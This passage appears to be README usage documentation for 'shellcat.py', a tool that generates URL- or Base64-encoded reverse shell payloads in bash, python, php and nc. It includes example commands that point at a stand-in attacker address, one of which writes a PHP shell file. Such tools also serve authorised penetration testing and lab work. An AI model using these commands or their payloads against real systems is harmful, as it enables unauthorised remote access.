positional arguments:
  shell_type                     Type of the shell (bash, python, php, nc, ...)
  ip                             IP address of the attacker

  -e, --encode                   URL encode the payload
  -b, --base64                   Base64 encode the payload
  -w FILENAME, --write FILENAME  Write the payload to a file
  -c, --copy                     Copy the payload to clipboard
```

## Examples

Generate a bash reverse shell payload:

```bash
python shellcat.py bash 10.10.10.10 1234
```

Generate a python reverse shell payload, URL encode it, and copy it to the clipboard:

```bash
python shellcat.py python 10.10.10.10 1234 -e -c
```

Generate a php reverse shell payload, Base64 encode it, and write it to a file:

```bash
python shellcat.py php 10.10.10.10 1234 -b -w shell.php
```

Generate a nc reverse shell payload, URL encode it, Base64 encode it, write it to a file, and copy it to the clipboard:

```bash
python shellcat.py nc 10.10.10.10 1234 -e -b -w payload.txt -c
```
